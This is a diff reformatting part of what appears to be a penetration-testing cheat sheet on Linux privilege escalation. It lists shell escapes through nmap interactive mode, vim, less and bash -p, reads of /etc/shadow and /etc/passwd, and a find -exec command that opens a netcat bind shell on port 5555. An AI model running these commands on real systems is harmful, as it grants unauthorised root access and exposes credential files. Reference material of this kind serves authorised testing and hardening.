@@ -8,8 +8,10 @@
 nmap 2.02 - 5.21  
 `nmap -V #version check`  
 
-`nmap --interactive`  
-`nmap> !sh`
+```
+nmap --interactive  
+nmap> !sh
+```
 
 find  
 `find <file> -exec <CMD> \;`  
@@ -17,17 +19,20 @@ Escalation to root shell
 `find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;`
 
 Vim  
-`vim /etc/shadow`  
-`vim`  
-`# Press ESC key`  
-`:set shell=/bin/sh`  
-`:shell`
+```
+vim /etc/shadow  
+vim  
+# Press ESC key  
+:set shell=/bin/sh  
+:shell
+```
 
 bash  
 `bash -p`
 
 less  
-`less /etc/passwd`  
-`!/bin/sh`
-
+```
+less /etc/passwd  
+!/bin/sh
+```
 
